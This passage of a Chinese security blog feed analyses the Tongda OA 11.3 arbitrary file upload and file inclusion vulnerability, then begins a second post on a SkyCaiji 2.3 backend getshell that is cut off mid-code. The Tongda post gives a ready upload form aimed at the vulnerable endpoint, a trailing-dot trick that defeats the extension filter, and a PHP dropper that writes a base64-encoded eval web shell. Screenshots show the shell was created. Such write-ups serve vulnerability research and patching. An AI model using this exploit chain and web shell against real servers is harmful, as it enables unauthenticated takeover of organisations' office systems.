class="string">"无文件上传"</span>));</span><br><span class="line"><span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$FILE_SIZE = attach_size($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$FILE_SIZE) &#123;</span><br><span class="line">$dataBack = <span class="keyword">array</span>(<span class="string">"status"</span> =&gt; <span class="number">0</span>, <span class="string">"content"</span> =&gt; <span class="string">"-ERR "</span> . _(<span class="string">"文件上传失败"</span>));</span><br><span class="line"><span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">"1"</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">$FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">$THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">"thumb_"</span> . $ATTACHMENT_NAME;</span><br><span class="line">CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$P_VER = (is_numeric($P_VER) ? intval($P_VER) : <span class="number">0</span>);</span><br><span class="line">$MSG_CATE = $_POST[<span class="string">"MSG_CATE"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($MSG_CATE == <span class="string">"file"</span>) &#123;</span><br><span class="line">$CONTENT = <span class="string">"[fm]"</span> . $ATTACHMENT_ID . <span class="string">"|"</span> . $ATTACHMENT_NAME . <span class="string">"|"</span> . $FILE_SIZE . <span class="string">"[/fm]"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($MSG_CATE == <span class="string">"image"</span>) &#123;</span><br><span class="line">$CONTENT = <span class="string">"[im]"</span> . $ATTACHMENT_ID . <span class="string">"|"</span> . $ATTACHMENT_NAME . <span class="string">"|"</span> . $FILE_SIZE . <span class="string">"[/im]"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$DURATION = intval($DURATION);</span><br><span class="line">$CONTENT = <span class="string">"[vm]"</span> . $ATTACHMENT_ID . <span class="string">"|"</span> . $ATTACHMENT_NAME . <span class="string">"|"</span> . $DURATION . <span class="string">"[/vm]"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$AID = <span class="number">0</span>;</span><br><span class="line">$POS = strpos($ATTACHMENT_ID, <span class="string">"@"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($POS !== <span class="keyword">false</span>) &#123;</span><br><span class="line">$AID = intval(substr($ATTACHMENT_ID, <span class="number">0</span>, $POS));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"INSERT INTO im_offline_file (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG,AID) values ('"</span> . date(<span class="string">"Y-m-d H:i:s"</span>) . <span class="string">"','"</span> . $_SESSION[<span class="string">"LOGIN_UID"</span>] . <span class="string">"','$DEST_UID','*"</span> . $ATTACHMENT_ID . <span class="string">"."</span> . $ATTACHMENT_NAME . <span class="string">"','$FILE_SIZE','0','$AID')"</span>;</span><br><span class="line">$cursor = exequery(TD::conn(), $query);</span><br><span class="line">$FILE_ID = mysql_insert_id();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($cursor === <span class="keyword">false</span>) &#123;</span><br><span class="line">$dataBack = <span class="keyword">array</span>(<span class="string">"status"</span> =&gt; <span class="number">0</span>, <span class="string">"content"</span> =&gt; <span class="string">"-ERR "</span> . _(<span class="string">"数据库操作失败"</span>));</span><br><span class="line"><span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dataBack = <span class="keyword">array</span>(<span class="string">"status"</span> =&gt; <span class="number">1</span>, <span class="string">"content"</span> =&gt; $CONTENT, <span class="string">"file_id"</span> =&gt; $FILE_ID);</span><br><span class="line"><span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">"2"</span>) &#123;</span><br><span class="line">$DURATION = intval($_POST[<span class="string">"DURATION"</span>]);</span><br><span class="line">$CONTENT = <span class="string">"[vm]"</span> . $ATTACHMENT_ID . <span class="string">"|"</span> . $ATTACHMENT_NAME . <span class="string">"|"</span> . $DURATION . <span class="string">"[/vm]"</span>;</span><br><span class="line">$query = <span class="string">"INSERT INTO WEIXUN_SHARE (UID, CONTENT, ADDTIME) VALUES ('"</span> . $_SESSION[<span class="string">"LOGIN_UID"</span>] . <span class="string">"', '"</span> . $CONTENT . <span class="string">"', '"</span> . time() . <span class="string">"')"</span>;</span><br><span class="line">$cursor = exequery(TD::conn(), $query);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"+OK "</span> . $CONTENT;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">"3"</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">$FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">$THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">"thumb_"</span> . $ATTACHMENT_NAME;</span><br><span class="line">CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"+OK "</span> . $ATTACHMENT_ID;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$CONTENT = <span class="string">"[fm]"</span> . $ATTACHMENT_ID . <span class="string">"|"</span> . $ATTACHMENT_NAME . <span class="string">"|"</span> . $FILE_SIZE . <span class="string">"[/fm]"</span>;</span><br><span class="line">$msg_id = send_msg($_SESSION[<span class="string">"LOGIN_UID"</span>], $DEST_UID, <span class="number">1</span>, $CONTENT, <span class="string">""</span>, <span class="number">2</span>);</span><br><span class="line">$query = <span class="string">"insert into IM_OFFLINE_FILE (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG) values ('"</span> . date(<span class="string">"Y-m-d H:i:s"</span>) . <span class="string">"','"</span> . $_SESSION[<span class="string">"LOGIN_UID"</span>] . <span class="string">"','$DEST_UID','*"</span> . $ATTACHMENT_ID . <span class="string">"."</span> . $ATTACHMENT_NAME . <span class="string">"','$FILE_SIZE','0')"</span>;</span><br><span class="line">$cursor = exequery(TD::conn(), $query);</span><br><span class="line">$FILE_ID = mysql_insert_id();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($cursor === <span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-ERR "</span> . _(<span class="string">"数据库操作失败"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($FILE_ID == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-ERR "</span> . _(<span class="string">"数据库操作失败2"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"+OK ,"</span> . $FILE_ID . <span class="string">","</span> . $msg_id;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从前往后分析，首先是如下代码</p><p><img src="/2020/05/15/通达OA任意文件上传与文件包含分析/1.png" alt="1"></p><p>该处我们只要传入一个P值就可以了，注意P的值不能为0或者空，接下来是该段代码</p><p><img src="/2020/05/15/通达OA任意文件上传与文件包含分析/2.png" alt="2"></p><p><code>td_verify_ids</code>函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">td_verify_ids</span><span class="params">($ids)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> !preg_match(<span class="string">"/[^0-9,]+/"</span>, $ids);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该处我们传入<code>DEST_UID</code>为1就可以了，接着我们直接来到了上传文件的代码段</p><p><img src="/2020/05/15/通达OA任意文件上传与文件包含分析/3.png" alt="3"></p><p><code>if (1 &lt;= count($_FILES))</code>用来判断有没有文件上传的请求，如果存在正常的文件上传请求，会执行到52行的<code>upload</code>函数，该函数中调用<code>is_uploadable</code>函数对文件名等做了一些限制，如图</p><p><img src="/2020/05/15/通达OA任意文件上传与文件包含分析/4.png" alt="4"></p><p>该处取出文件名最后三个字符来判断是不是php文件，在这里我们可以在php后面加.，这样的话不仅可以绕过此处，还可以绕过其他扩展名处的过滤，并且写文件时最后的.会被删掉，这样我们就可以写入php文件</p><p>回到<code>upload</code>函数，他的返回值如下</p><p><img src="/2020/05/15/通达OA任意文件上传与文件包含分析/6.png" alt="6"></p><p>接着有下面的代码</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ATTACHMENT_ID = <span class="keyword">substr</span>($ATTACHMENTS[<span class="string">"ID"</span>], <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">$ATTACHMENT_NAME = <span class="keyword">substr</span>($ATTACHMENTS[<span class="string">"NAME"</span>], <span class="number">0</span>, -<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>接着当变量<code>$UPLOAD_MODE</code>为1或2的时候都会返回我们上传后的文件名，该变量可以通过全局变量覆盖来得到，在<code>common.inc.php</code>中我们可以找到对应实现变量覆盖功能的代码段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &lt; count($_POST)) &#123;</span><br><span class="line">$arr_html_fields = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $s_key =&gt; $s_value ) &#123;</span><br><span class="line"><span class="keyword">if</span> (substr($s_key, <span class="number">0</span>, <span class="number">7</span>) == <span class="string">"_SERVER"</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (substr($s_key, <span class="number">0</span>, <span class="number">15</span>) != <span class="string">"TD_HTML_EDITOR_"</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!is_array($s_value)) &#123;</span><br><span class="line">$_POST[$s_key] = addslashes(strip_tags($s_value));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s_key = $_POST[$s_key];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (($s_key == <span class="string">"TD_HTML_EDITOR_FORM_HTML_DATA"</span>) || ($s_key == <span class="string">"TD_HTML_EDITOR_PRCS_IN"</span>) || ($s_key == <span class="string">"TD_HTML_EDITOR_PRCS_OUT"</span>) || ($s_key == <span class="string">"TD_HTML_EDITOR_QTPL_PRCS_SET"</span>) || (<span class="keyword">isset</span>($_POST[<span class="string">"ACTION_TYPE"</span>]) &amp;&amp; (($_POST[<span class="string">"ACTION_TYPE"</span>] == <span class="string">"approve_center"</span>) || ($_POST[<span class="string">"ACTION_TYPE"</span>] == <span class="string">"workflow"</span>) || ($_POST[<span class="string">"ACTION_TYPE"</span>] == <span class="string">"sms"</span>) || ($_POST[<span class="string">"ACTION_TYPE"</span>] == <span class="string">"wiki"</span>)) &amp;&amp; (($s_key == <span class="string">"CONTENT"</span>) || ($s_key == <span class="string">"TD_HTML_EDITOR_CONTENT"</span>) || ($s_key == <span class="string">"TD_HTML_EDITOR_TPT_CONTENT"</span>)))) &#123;</span><br><span class="line"><span class="keyword">unset</span>($_POST[$s_key]);</span><br><span class="line">$s_key = ($s_key == <span class="string">"CONTENT"</span> ? $s_key : substr($s_key, <span class="number">15</span>));</span><br><span class="line">$s_key = addslashes($s_value);</span><br><span class="line">$arr_html_fields[$s_key] = $s_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$encoding = mb_detect_encoding($s_value, <span class="string">"GBK,UTF-8"</span>);</span><br><span class="line"><span class="keyword">unset</span>($_POST[$s_key]);</span><br><span class="line">$s_key = substr($s_key, <span class="number">15</span>);</span><br><span class="line">$s_key = addslashes(rich_text_clean($s_value, $encoding));</span><br><span class="line">$arr_html_fields[$s_key] = $s_key;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reset($_POST);</span><br><span class="line">$_POST = array_merge($_POST, $arr_html_fields);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &lt; count($_GET)) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $s_key =&gt; $s_value ) &#123;</span><br><span class="line"><span class="keyword">if</span> (substr($s_key, <span class="number">0</span>, <span class="number">7</span>) == <span class="string">"_SERVER"</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_array($s_value)) &#123;</span><br><span class="line">$_GET[$s_key] = addslashes(strip_tags($s_value));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s_key = $_GET[$s_key];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reset($_GET);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面构造一下上传表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://localhost:8001/ispirit/im/upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>  <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">"text"</span><span class="attr">name</span>=<span class="string">'P'</span> <span class="attr">value</span> = <span class="string">1</span>  &gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">"text"</span><span class="attr">name</span>=<span class="string">'UPLOAD_MODE'</span> <span class="attr">value</span> = <span class="string">2</span> &gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"DEST_UID"</span> <span class="attr">value</span> = <span class="string">1</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"ATTACHMENT"</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> &gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/05/15/通达OA任意文件上传与文件包含分析/7.png" alt="7"></p><p>但是上传后文件其实是不在<code>web</code>目录下的，我们无法来直接访问我们的<code>shell</code>文件，上传后的文件路径为<code>MYOA/attach/im/</code> ，这就需要结合下面的文件包含点来利用</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>漏洞点位于<code>/webroot/ispirit/interface/gateway.php</code>中，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/session.php"</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/conn.php"</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"inc/utility_org.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($P != <span class="string">""</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/[^a-z0-9;]+/i"</span>, $P)) &#123;</span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">"非法参数"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_id($P);</span><br><span class="line">session_start();</span><br><span class="line">session_write_close();</span><br><span class="line"><span class="keyword">if</span> (($_SESSION[<span class="string">"LOGIN_USER_ID"</span>] == <span class="string">""</span>) || ($_SESSION[<span class="string">"LOGIN_UID"</span>] == <span class="string">""</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">"RELOGIN"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($json) &#123;</span><br><span class="line">$json = stripcslashes($json);</span><br><span class="line">$json = (<span class="keyword">array</span>) json_decode($json);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($json <span class="keyword">as</span> $key =&gt; $val ) &#123;</span><br><span class="line"><span class="keyword">if</span> ($key == <span class="string">"data"</span>) &#123;</span><br><span class="line">$val = (<span class="keyword">array</span>) $val;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($val <span class="keyword">as</span> $keys =&gt; $value ) &#123;</span><br><span class="line">$keys = $value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($key == <span class="string">"url"</span>) &#123;</span><br><span class="line">$url = $val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($url != <span class="string">""</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (substr($url, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span>) &#123;</span><br><span class="line">$url = substr($url, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((strpos($url, <span class="string">"general/"</span>) !== <span class="keyword">false</span>) || (strpos($url, <span class="string">"ispirit/"</span>) !== <span class="keyword">false</span>) || (strpos($url, <span class="string">"module/"</span>) !== <span class="keyword">false</span>)) &#123;</span><br><span class="line"><span class="keyword">include_once</span> $url;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问该文件无需认证，我们直接赋值<code>$json</code>，这里需要满足<code>json</code>中存在键值为<code>url</code>的值，接着需要满足该处条件</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((<span class="name">strpos</span>($url, <span class="string">"general/"</span>) !== false) || (<span class="name">strpos</span>($url, <span class="string">"ispirit/"</span>) !== false) || (<span class="name">strpos</span>($url, <span class="string">"module/"</span>) !== false))</span><br></pre></td></tr></table></figure><p>我们只需要在包含路径中存在<code>general/</code>或<code>ispirit/</code>或<code>module/</code>即可，接着就可以包含我们刚才存在的<code>shell</code>文件了，我们可以在<code>shell</code>文件中执行写文件功能，在<code>gateway.php</code>同目录下生成可访问的一句话文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$shell = base64_decode(<span class="string">"PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4="</span>);</span><br><span class="line">file_put_contents(<span class="string">'shell.php'</span>, $shell);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>包含<code>shell</code>文件</p><p><img src="/2020/05/15/通达OA任意文件上传与文件包含分析/8.png" alt="8"></p><p>成功生成<code>shell</code>文件</p><p><img src="/2020/05/15/通达OA任意文件上传与文件包含分析/9.png" alt="9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;分析一下前段时间爆出的通达OA任意文件上传+文件包含漏洞，本文测试版本为11.3&lt;/p&gt;
&lt;h1 id=&quot;代码分析&quot;&gt;&lt;a href=&quot;#代
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>蓝天采集器V2.3后台getshell</title>
    <link href="https://yml-sec.top/2020/05/09/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8V2-3%E5%90%8E%E5%8F%B0getshell/"/>
    <id>https://yml-sec.top/2020/05/09/%E8%93%9D%E5%A4%A9%E9%87%87%E9%9B%86%E5%99%A8V2-3%E5%90%8E%E5%8F%B0getshell/</id>
    <published>2020-05-09T10:16:05.000Z</published>
    <updated>2020-05-09T12:24:53.597Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>蓝天采集器是一款免费的数据采集发布爬虫软件，采用php+mysql开发，可部署在云服务器，几乎能采集所有类型的网页，无缝对接各类CMS建站程序，免登录实时发布数据，全自动无需人工干预！是大数据、云时代网站数据自动化采集的最佳云端爬虫软件，2.3版本下载地址</p><p><a href="https://github.com/zorlan/skycaiji/tree/19e77d03c8be2c4e40320ddc56213c271bc3721e" target="_blank" rel="noopener">https://github.com/zorlan/skycaiji/tree/19e77d03c8be2c4e40320ddc56213c271bc3721e</a></p><h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>漏洞触发点在<code>/SkycaijiApp/admin/controller/Store.php</code>文件中的<code>installPluginAction</code>函数，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">installPluginAction</span><span class="params">()</span></span>&#123;</span><br><span class="line">$plugin=json_decode(base64_decode(input(<span class="string">'post.plugin'</span>)),<span class="keyword">true</span>);</span><br><span class="line">$plugin[<span class="string">'code'</span>]=base64_decode($plugin[<span class="string">'code'</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($plugin[<span class="string">'app'</span>]))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;dispatchJump(<span class="keyword">false</span>,<span class="string">'标识错误'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($plugin[<span class="string">'name'</span>]))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;dispatchJump(<span class="keyword">false</span>,<span class="string">'名称错误'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($plugin[<span class="string">'type'</span>]))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;dispatchJump(<span class="keyword">false</span>,<span class="string">'类型错误'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($plugin[<span class="string">'module'</span>]))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;dispatchJump(<span class="keyword">false</span>,<span class="string">'模块错误'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($plugin[<span class="string">'code'</span>]))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;dispatchJump(<span class="keyword">false</span>,<span class="string">'不是可用的程序'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($plugin[<span class="string">'tpl'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">$plugin[<span class="string">'tpl'</span>]=base64_decode($plugin[<span class="string">'tpl'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$newData=<span class="keyword">array</span>(<span class="string">'app'</span>=&gt;$plugin[<span class="string">'app'</span>],<span class="string">'name'</span>=&gt;$plugin[<span class="string">'name'</span>],<span class="string">'desc'</span>=&gt;$plugin[<span class="string">'desc'</span>],<span class="string">'uptime'</span>=&gt;$plugin[<span class="string">'uptime'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$newData[<span class="string">'provider_id'</span>]=<span class="keyword">$this</span>-&gt;_getStoreProvid($plugin[<span class="string">'store_url'</span>]);</span><br><span class="line"></span><br><span 